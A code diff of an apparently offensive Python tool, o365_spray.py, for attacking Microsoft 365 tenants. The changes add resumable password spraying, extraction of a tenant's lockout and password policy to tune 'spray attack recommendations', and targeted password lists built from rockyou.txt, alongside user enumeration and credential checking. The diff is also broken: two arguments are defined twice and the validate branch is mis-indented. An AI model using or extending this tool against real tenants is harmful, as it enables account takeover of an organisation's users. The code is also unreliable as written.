+            self.progress_data['locked_accounts'].append(username)
+            self.save()
+
+    def mark_password_complete(self, password: str):
+        """Mark a password as fully tested"""
+        if password not in self.progress_data['completed_passwords']:
+            self.progress_data['completed_passwords'].append(password)
+            self.save()
+
+    def is_tested(self, username: str, password: str) -> bool:
+        """Check if combination was already tested"""
+        combo = f"{username}:{password}"
+        return combo in self.progress_data['tested_combinations']
+
+    def mark_tested(self, username: str, password: str):
+        """Mark combination as tested"""
+        combo = f"{username}:{password}"
+        if combo not in self.progress_data['tested_combinations']:
+            self.progress_data['tested_combinations'].append(combo)
+
+    def get_resume_point(self) -> Tuple[int, int]:
+        """Get the point to resume from"""
+        return (
+            self.progress_data['current_round'],
+            self.progress_data['current_password_index']
+        )
+
+    def clear(self):
+        """Clear progress file"""
+        if Path(self.progress_file).exists():
+            Path(self.progress_file).unlink()
+
+    def get_stats(self) -> Dict:
+        """Get progress statistics"""
+        return {
+            'valid_creds': len(self.progress_data['valid_creds']),
+            'locked_accounts': len(self.progress_data['locked_accounts']),
+            'tested_combinations': len(self.progress_data['tested_combinations']),
+            'completed_passwords': len(self.progress_data['completed_passwords']),
+            'current_round': self.progress_data['current_round']
+        }
 
 def load_file(filepath: str) -> List[str]:
     """Load lines from a file, stripping whitespace and handling various encodings"""
@@ -1416,37 +2223,57 @@ Examples:
   # Validate domain uses O365 (with full reconnaissance)
   python3 o365_spray.py --validate -d target.com -o recon_report -v
 
+  # Extract password policy and generate targeted list
+  python3 o365_spray.py --get-policy -d target.com -o spray_list
+
+  # Generate from custom dictionary
+  python3 o365_spray.py --get-policy -d target.com -o spray_list -p /path/to/dict.txt --max-passwords 500
+
   # Enumerate valid users
   python3 o365_spray.py --enum -u users.txt -d target.com -o valid_users.txt
 
   # Validate credentials from file
   python3 o365_spray.py --check-creds -c creds.txt -o valid_creds.txt
 
-  # Password spray
+  # Password spray (with progress tracking)
   python3 o365_spray.py --spray -u users.txt -p passwords.txt --count 1 --delay 30 -o compromised.txt
 
-  # Quick single password spray
-  python3 o365_spray.py --spray -u users.txt -P 'Winter2024!' --count 1 --delay 30
+  # Resume interrupted spray
+  python3 o365_spray.py --spray -u users.txt -p passwords.txt --count 1 --delay 30 -o compromised.txt --resume
         """
     )
 
     # Mode selection
     mode = parser.add_mutually_exclusive_group(required=True)
     mode.add_argument('--validate', action='store_true', help='Validate if domain uses O365 (includes full recon)')
+    mode.add_argument('--get-policy', action='store_true', help='Extract password policy and generate targeted list')
     mode.add_argument('--enum', action='store_true', help='Username enumeration mode')
     mode.add_argument('--check-creds', action='store_true', help='Credential validation mode')
     mode.add_argument('--spray', action='store_true', help='Password spraying mode')
 
     # Input files
     parser.add_argument('-u', '--usernames', help='File containing usernames (one per line)')
-    parser.add_argument('-p', '--passwords', help='File containing passwords (one per line)')
+    parser.add_argument('-p', '--passwords', help='File containing passwords (one per line) or source dictionary for filtering')
     parser.add_argument('-P', '--password', help='Single password to test')
     parser.add_argument('-c', '--credentials', help='File with username:password format')
     parser.add_argument('-d', '--domain', help='Domain for validation/enumeration (e.g., target.com)')
+    # Password policy options
+    parser.add_argument('--generate-passwords', action='store_true',
+                       help='Generate targeted password list based on policy (use with --validate)')
+    parser.add_argument('--max-passwords', type=int, default=1000,
+                       help='Maximum passwords to extract from dictionary (default: 1000)')
+    parser.add_argument('--smart-only', action='store_true',
+                       help='Only use smart targeted passwords, skip dictionary filtering')
 
     # Enumeration options
     parser.add_argument('--method', choices=['office', 'activesync', 'onedrive'],
                        default='office', help='Enumeration method (default: office)')
+
+    # Password policy options
+    parser.add_argument('--max-passwords', type=int, default=1000,
+                       help='Maximum passwords to extract from dictionary (default: 1000)')
+    parser.add_argument('--smart-only', action='store_true',
+                       help='Only use smart targeted passwords, skip dictionary filtering')
 
     # Spray options
     parser.add_argument('--count', type=int, default=1,
@@ -1457,6 +2284,10 @@ Examples:
                        help='Min seconds between users (default: 2)')
     parser.add_argument('--delay-user-max', type=int, default=5,
                        help='Max seconds between users (default: 5)')
+    parser.add_argument('--resume', action='store_true',
+                       help='Resume from previous spray progress (default: True)')
+    parser.add_argument('--no-resume', action='store_true',
+                       help='Start fresh spray, ignore previous progress')
 
     # Output
     parser.add_argument('-o', '--output', help='Output file for results')
@@ -1467,134 +2298,327 @@ Examples:
     args = parser.parse_args()
 
     # Validation mode - Check if domain uses O365 with full reconnaissance
-    if args.validate:
-        if not args.domain:
-            parser.error("--validate requires -d/--domain")
+        if args.validate:
+            if not args.domain:
+                parser.error("--validate requires -d/--domain")
 
-        validator = O365DomainValidator(verbose=args.verbose)
-        results = validator.validate_domain(args.domain)
+            validator = O365DomainValidator(verbose=args.verbose)
+            results = validator.validate_domain(args.domain)
 
-        # Save results to JSON and summary
-        if args.output:
-            # Save JSON report
-            json_file = args.output if args.output.endswith('.json') else f"{args.output}.json"
-            try:
-                with open(json_file, 'w') as f:
-                    json.dump(results, f, indent=2)
-                print(f"\n[+] JSON report saved to: {json_file}")
-            except Exception as e:
-                print(f"\n[-] Error saving JSON report: {e}")
+            # Generate password list if requested
+            if args.generate_passwords and results.get('password_policy', {}).get('policy'):
+                print("\n" + "="*60)
+                print("GENERATING TARGETED PASSWORD LIST")
+                print("="*60)
 
-            # Also save a human-readable summary
-            txt_file = json_file.replace('.json', '_summary.txt')
-            try:
-                with open(txt_file, 'w') as f:
-                    f.write(f"O365 Validation Report: {results['domain']}\n")
-                    f.write(f"{'='*60}\n")
-                    f.write(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
-                    f.write(f"{'='*60}\n\n")
+                policy = results['password_policy']['policy']
 
-                    f.write(f"Uses O365: {results['is_o365']}\n")
-                    f.write(f"Tenant ID: {results.get('tenant_id', 'N/A')}\n\n")
+                # Determine output filename
+                if args.output:
+                    password_file = args.output.replace('.json', '_passwords.txt').replace('_summary.txt', '_passwords.txt')
+                    if not password_file.endswith('_passwords.txt'):
+                        password_file = f"{args.output}_passwords.txt"
+                else:
+                    password_file = f"{args.domain.split('.')[0]}_passwords.txt"
 
-                    f.write("BASIC CHECKS:\n")
-                    f.write("-" * 60 + "\n")
-                    for check_name, check_data in results['checks'].items():
-                        f.write(f"\n{check_name.upper()}:\n")
-                        f.write(f"  Valid: {check_data.get('valid')}\n")
-                        if 'message' in check_data:
-                            f.write(f"  Message: {check_data['message']}\n")
-                        if 'details' in check_data and check_data['details']:
-                            f.write(f"  Details:\n")
-                            for key, value in check_data['details'].items():
-                                f.write(f"    {key}: {value}\n")
+                # Determine source dictionary
+                source_dict = args.passwords if args.passwords else '/vapt/passwords/rockyou.txt'
 
-                    if 'reconnaissance' in results and results['reconnaissance']:
-                        f.write(f"\n\n{'='*60}\n")
-                        f.write("EXTENDED RECONNAISSANCE\n")
+                passwords = generate_password_list(
+                    policy,
+                    password_file,
+                    source_dict=source_dict,
+                    max_passwords=args.max_passwords,
+                    smart_only=args.smart_only
+                )
+
+                recommendations = results['password_policy'].get('recommendations', {})
+
+                print(f"\n[+] Ready to spray with optimized parameters:")
+                print(f"    python o365_spray.py --spray \\")
+                print(f"        -u users.txt \\")
+                print(f"        -p {password_file} \\")
+                print(f"        --count {recommendations.get('attempts_per_round', 1)} \\")
+                print(f"        --delay {recommendations.get('delay_between_rounds', 30)} \\")
+                print(f"        -o results.txt")
+
+            # Save results to JSON and summary
+            if args.output:
+                # Save JSON report
+                json_file = args.output if args.output.endswith('.json') else f"{args.output}.json"
+                try:
+                    with open(json_file, 'w') as f:
+                        json.dump(results, f, indent=2)
+                    print(f"\n[+] JSON report saved to: {json_file}")
+                except Exception as e:
+                    print(f"\n[-] Error saving JSON report: {e}")
+
+                # Also save a human-readable summary
+                txt_file = json_file.replace('.json', '_summary.txt')
+                try:
+                    with open(txt_file, 'w') as f:
+                        f.write(f"O365 Validation Report: {results['domain']}\n")
+                        f.write(f"{'='*60}\n")
+                        f.write(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
+                        f.write(f"{'='*60}\n\n")
+
+                        f.write(f"Uses O365: {results['is_o365']}\n")
+                        f.write(f"Tenant ID: {results.get('tenant_id', 'N/A')}\n\n")
+
+                        f.write("BASIC CHECKS:\n")
+                        f.write("-" * 60 + "\n")
+                        for check_name, check_data in results['checks'].items():
+                            f.write(f"\n{check_name.upper()}:\n")
+                            f.write(f"  Valid: {check_data.get('valid')}\n")
+                            if 'message' in check_data:
+                                f.write(f"  Message: {check_data['message']}\n")
+                            if 'details' in check_data and check_data['details']:
+                                f.write(f"  Details:\n")
+                                for key, value in check_data['details'].items():
+                                    f.write(f"    {key}: {value}\n")
+
+                        if 'reconnaissance' in results and results['reconnaissance']:
+                            f.write(f"\n\n{'='*60}\n")
+                            f.write("EXTENDED RECONNAISSANCE\n")
+                            f.write(f"{'='*60}\n")
+
+                            # Tenant Details
+                            if 'tenant_details' in results['reconnaissance']:
+                                tenant = results['reconnaissance']['tenant_details']
+                                if 'openid_v2' in tenant:
+                                    f.write("\nTenant Configuration:\n")
+                                    f.write("-" * 40 + "\n")
+                                    for key, value in tenant['openid_v2'].items():
+                                        if value:
+                                            f.write(f"  {key}: {value}\n")
+
+                            # Associated Domains
+                            if 'associated_domains' in results['reconnaissance']:
+                                domains = results['reconnaissance']['associated_domains']
+                                if isinstance(domains, list):
+                                    f.write(f"\nAssociated Domains ({len(domains)}):\n")
+                                    f.write("-" * 40 + "\n")
+                                    for d in domains:
+                                        f.write(f"  - {d}\n")
+
+                            # Applications
+                            if 'applications' in results['reconnaissance']:
+                                apps = results['reconnaissance']['applications']
+                                if isinstance(apps, dict):
+                                    f.write(f"\nAccessible Applications: {apps.get('total_accessible', 0)}\n")
+                                    f.write("-" * 40 + "\n")
+
+                                    if apps.get('known_apps'):
+                                        f.write("\nKnown Microsoft Applications:\n")
+                                        for app in apps['known_apps']:
+                                            f.write(f"  - {app['name']}\n")
+                                            f.write(f"    Client ID: {app['client_id']}\n")
+
+                                    if apps.get('custom_apps'):
+                                        f.write(f"\nPotential Custom Applications: {len(apps['custom_apps'])}\n")
+                                        for app in apps['custom_apps'][:10]:  # Top 10
+                                            f.write(f"  - {app.get('potential_redirect_uri', 'Unknown')}\n")
+
+                            # Username Patterns
+                            if 'username_patterns' in results['reconnaissance']:
+                                patterns_data = results['reconnaissance']['username_patterns']
+                                if isinstance(patterns_data, dict):
+                                    patterns = patterns_data.get('patterns', [])
+                                    f.write(f"\nUsername Format Patterns ({len(patterns)} discovered):\n")
+                                    f.write("-" * 40 + "\n")
+                                    if patterns:
+                                        for p in patterns[:10]:  # Top 10
+                                            f.write(f"  - {p['pattern']}: {p['confidence']}% confidence ")
+                                            f.write(f"({p['matches']}/{p['attempts']} matches)\n")
+                                    else:
+                                        f.write("  No patterns discovered with test names\n")
+
+                            # Guest Access
+                            if 'guest_access' in results['reconnaissance']:
+                                guest = results['reconnaissance']['guest_access']
+                                if isinstance(guest, dict):
+                                    f.write("\nGuest Access & Misconfigurations:\n")
+                                    f.write("-" * 40 + "\n")
+                                    f.write(f"  Guest Users Allowed: {guest.get('guest_users_allowed', False)}\n")
+
+                                    if guest.get('external_domains_found'):
+                                        f.write(f"  External Domains Found: {len(guest['external_domains_found'])}\n")
+                                        for domain in guest['external_domains_found']:
+                                            f.write(f"    - {domain}\n")
+
+                                    if guest.get('oauth_misconfigurations'):
+                                        f.write(f"  OAuth Misconfigurations: {len(guest['oauth_misconfigurations'])}\n")
+                                        for misconfig in guest['oauth_misconfigurations']:
+                                            f.write(f"    - {misconfig.get('type', 'Unknown')}: ")
+                                            f.write(f"{misconfig.get('description', 'N/A')} ")
+                                            f.write(f"(Risk: {misconfig.get('risk', 'unknown')})\n")
+
+                        # Password Policy Section (NEW)
+                        if 'password_policy' in results and 'policy' in results['password_policy']:
+                            f.write(f"\n\n{'='*60}\n")
+                            f.write("PASSWORD POLICY ANALYSIS\n")
+                            f.write(f"{'='*60}\n")
+
+                            policy = results['password_policy']['policy']
+                            recommendations = results['password_policy'].get('recommendations', {})
+
+                            f.write("\nPassword Requirements:\n")
+                            f.write("-" * 40 + "\n")
+                            if policy.get('password_requirements'):
+                                req = policy['password_requirements']
+                                f.write(f"  Minimum Length: {req.get('min_length', 8)} characters\n")
+                                f.write(f"  Maximum Length: {req.get('max_length', 256)} characters\n")
+
+                                if req.get('guidance'):
+                                    guidance = req['guidance']
+                                    f.write(f"  Recommendation: {guidance.get('recommendation', 'N/A')}\n")
+                                    f.write(f"  Banned List: {guidance.get('banned_list', 'N/A')}\n")
+
+                            f.write("\nLockout Policy:\n")
+                            f.write("-" * 40 + "\n")
+                            if policy.get('lockout_policy'):
+                                lockout = policy['lockout_policy']
+                                f.write(f"  Threshold: {lockout.get('estimated_threshold', 'Unknown')} attempts\n")
+                                f.write(f"  Duration: {lockout.get('lockout_duration', 'Unknown')}\n")
+                                if lockout.get('notes'):
+                                    f.write(f"  Notes: {lockout['notes']}\n")
+
+                            if policy.get('smart_lockout', {}).get('enabled'):
+                                f.write("\nSmart Lockout: ENABLED\n")
+                                f.write("-" * 40 + "\n")
+                                smart = policy['smart_lockout']
+                                if smart.get('features'):
+                                    f.write("  Features:\n")
+                                    for feature in smart['features']:
+                                        f.write(f"    - {feature}\n")
+
+                            if policy.get('mfa_status', {}).get('enforced'):
+                                f.write("\n⚠ MFA: ENFORCED\n")
+                                f.write("-" * 40 + "\n")
+                                f.write("  Valid credentials may still require MFA\n")
+
+                            f.write("\nSpray Attack Recommendations:\n")
+                            f.write("-" * 40 + "\n")
+                            if recommendations:
+                                f.write(f"  Delay Between Rounds: {recommendations.get('delay_between_rounds', 30)} minutes\n")
+                                f.write(f"  Attempts Per Round: {recommendations.get('attempts_per_round', 1)}\n")
+                                f.write(f"  Delay Between Users: {recommendations.get('delay_between_users', 5)} seconds\n")
+
+                                if recommendations.get('risk_assessment'):
+                                    f.write("\n  Risk Assessment:\n")
+                                    for key, value in recommendations['risk_assessment'].items():
+                                        f.write(f"    {key.replace('_', ' ').title()}: {value}\n")
+
+                        f.write(f"\n{'='*60}\n")
+                        f.write("END OF REPORT\n")
                         f.write(f"{'='*60}\n")
 
-                        # Tenant Details
-                        if 'tenant_details' in results['reconnaissance']:
-                            tenant = results['reconnaissance']['tenant_details']
-                            if 'openid_v2' in tenant:
-                                f.write("\nTenant Configuration:\n")
-                                f.write("-" * 40 + "\n")
-                                for key, value in tenant['openid_v2'].items():
-                                    if value:
-                                        f.write(f"  {key}: {value}\n")
+                    print(f"[+] Summary report saved to: {txt_file}")
+                except Exception as e:
+                    print(f"\n[-] Error saving summary report: {e}")
 
-                        # Associated Domains
-                        if 'associated_domains' in results['reconnaissance']:
-                            domains = results['reconnaissance']['associated_domains']
-                            if isinstance(domains, list):
-                                f.write(f"\nAssociated Domains ({len(domains)}):\n")
-                                f.write("-" * 40 + "\n")
-                                for d in domains:
-                                    f.write(f"  - {d}\n")
+            # Exit with appropriate code
+            sys.exit(0 if results['is_o365'] else 1)
 
-                        # Applications
-                        if 'applications' in results['reconnaissance']:
-                            apps = results['reconnaissance']['applications']
-                            if isinstance(apps, dict):
-                                f.write(f"\nAccessible Applications: {apps.get('total_accessible', 0)}\n")
-                                f.write("-" * 40 + "\n")
+    # Get password policy mode
+    elif args.get_policy:
+        if not args.domain:
+            parser.error("--get-policy requires -d/--domain")
 
-                                if apps.get('known_apps'):
-                                    f.write("\nKnown Microsoft Applications:\n")
-                                    for app in apps['known_apps']:
-                                        f.write(f"  - {app['name']}\n")
-                                        f.write(f"    Client ID: {app['client_id']}\n")
+        # First, get tenant ID
+        print("[*] Getting tenant information...")
+        validator = O365DomainValidator(verbose=False)
+        openid_valid, openid_msg, tenant_id = validator.check_openid_config(args.domain)
 
-                                if apps.get('custom_apps'):
-                                    f.write(f"\nPotential Custom Applications: {len(apps['custom_apps'])}\n")
-                                    for app in apps['custom_apps'][:10]:  # Top 10
-                                        f.write(f"  - {app.get('potential_redirect_uri', 'Unknown')}\n")
+        if not tenant_id:
+            print("[-] Could not retrieve tenant ID")
+            sys.exit(1)
 
-                        # Username Patterns
-                        if 'username_patterns' in results['reconnaissance']:
-                            patterns_data = results['reconnaissance']['username_patterns']
-                            if isinstance(patterns_data, dict):
-                                patterns = patterns_data.get('patterns', [])
-                                f.write(f"\nUsername Format Patterns ({len(patterns)} discovered):\n")
-                                f.write("-" * 40 + "\n")
-                                if patterns:
-                                    for p in patterns[:10]:  # Top 10
-                                        f.write(f"  - {p['pattern']}: {p['confidence']}% confidence ")
-                                        f.write(f"({p['matches']}/{p['attempts']} matches)\n")
-                                else:
-                                    f.write("  No patterns discovered with test names\n")
+        print(f"[+] Tenant ID: {tenant_id}\n")
 
-                        # Guest Access
-                        if 'guest_access' in results['reconnaissance']:
-                            guest = results['reconnaissance']['guest_access']
-                            if isinstance(guest, dict):
-                                f.write("\nGuest Access & Misconfigurations:\n")
-                                f.write("-" * 40 + "\n")
-                                f.write(f"  Guest Users Allowed: {guest.get('guest_users_allowed', False)}\n")
+        # Extract policy
+        policy_checker = O365PasswordPolicy(verbose=args.verbose)
+        policy = policy_checker.get_password_policy(args.domain, tenant_id)
 
-                                if guest.get('external_domains_found'):
-                                    f.write(f"  External Domains Found: {len(guest['external_domains_found'])}\n")
-                                    for domain in guest['external_domains_found']:
-                                        f.write(f"    - {domain}\n")
+        # Generate recommendations
+        recommendations = policy_checker.generate_spray_recommendations(policy)
 
-                                if guest.get('oauth_misconfigurations'):
-                                    f.write(f"  OAuth Misconfigurations: {len(guest['oauth_misconfigurations'])}\n")
-                                    for misconfig in guest['oauth_misconfigurations']:
-                                        f.write(f"    - {misconfig.get('type', 'Unknown')}: ")
-                                        f.write(f"{misconfig.get('description', 'N/A')} ")
-                                        f.write(f"(Risk: {misconfig.get('risk', 'unknown')})\n")
+        # Display results
+        print("\n" + "="*60)
+        print("PASSWORD POLICY ANALYSIS")
+        print("="*60)
 
-                    f.write(f"\n{'='*60}\n")
-                    f.write("END OF REPORT\n")
-                    f.write(f"{'='*60}\n")
+        print(f"\nPassword Requirements:")
+        print(f"  - Minimum Length: {policy['password_requirements'].get('min_length', 8)} characters")
+        print(f"  - Maximum Length: {policy['password_requirements'].get('max_length', 256)} characters")
 
-                print(f"[+] Summary report saved to: {txt_file}")
+        if policy['password_requirements'].get('guidance'):
+            guidance = policy['password_requirements']['guidance']
+            print(f"  - Guidance: {guidance.get('recommendation')}")
+            print(f"  - Banned List: {guidance.get('banned_list')}")
+
+        print(f"\nLockout Policy:")
+        lockout = policy['lockout_policy']
+        print(f"  - Estimated Threshold: {lockout.get('estimated_threshold', 'Unknown')} attempts")
+        print(f"  - Lockout Duration: {lockout.get('lockout_duration', 'Unknown')}")
+
+        if policy.get('smart_lockout', {}).get('enabled'):
+            print(f"\nSmart Lockout: ENABLED")
+            print(f"  - Type: Cloud-based intelligent lockout")
+            print(f"  - Features:")
+            for feature in policy['smart_lockout'].get('features', [])[:4]:
+                print(f"    • {feature}")
+
+        if policy.get('mfa_status', {}).get('enforced'):
+            print(f"\n⚠ MFA Status: ENFORCED")
+            print(f"  - Valid credentials may still require MFA")
+
+        print(f"\n" + "="*60)
+        print("SPRAY ATTACK RECOMMENDATIONS")
+        print("="*60)
+
+        print(f"\nOptimal Spray Parameters:")
+        print(f"  - Delay Between Rounds: {recommendations['delay_between_rounds']} minutes")
+        print(f"  - Attempts Per Round: {recommendations['attempts_per_round']}")
+        print(f"  - Delay Between Users: {recommendations['delay_between_users']} seconds")
+
+        print(f"\nRisk Assessment:")
+        for key, value in recommendations['risk_assessment'].items():
+            print(f"  - {key.replace('_', ' ').title()}: {value}")
+
+        # Generate password list
+        if args.output:
+            password_file = args.output if args.output.endswith('.txt') else f"{args.output}.txt"
+
+            # Determine source dictionary
+            source_dict = args.passwords if args.passwords else '/vapt/passwords/rockyou.txt'
+
+            passwords = generate_password_list(
+                policy,
+                password_file,
+                source_dict=source_dict,
+                max_passwords=args.max_passwords,
+                smart_only=args.smart_only
+            )
+
+            print(f"\n[+] Use generated passwords:")
+            print(f"    python o365_spray.py --spray -u users.txt -p {password_file} --count {recommendations['attempts_per_round']} --delay {recommendations['delay_between_rounds']}")
+        else:
+            print(f"\n💡 Use -o <filename> to generate a targeted password list")
+
+        # Save full policy to JSON
+        if args.output:
+            json_file = args.output.replace('.txt', '_policy.json')
+            try:
+                with open(json_file, 'w') as f:
+                    full_report = {
+                        'policy': policy,
+                        'recommendations': recommendations
+                    }
+                    json.dump(full_report, f, indent=2)
+                print(f"[+] Full policy analysis saved to: {json_file}")
             except Exception as e:
-                print(f"\n[-] Error saving summary report: {e}")
-
-        # Exit with appropriate code
-        sys.exit(0 if results['is_o365'] else 1)
+                print(f"[-] Error saving policy: {e}")
 
     # Enumeration mode
     elif args.enum:
@@ -1642,6 +2666,9 @@ Examples:
         else:
             passwords = load_file(args.passwords)
 
+        # Determine resume behavior
+        resume = not args.no_resume
+
         sprayer = O365Sprayer(
             delay_min=args.delay_user,
             delay_max=args.delay_user_max,
@@ -1653,7 +2680,8 @@ Examples:
             passwords,
             count=args.count,
             delay_spray=args.delay,
-            output_file=args.output
+            output_file=args.output,
+            resume=resume
         )
 
 
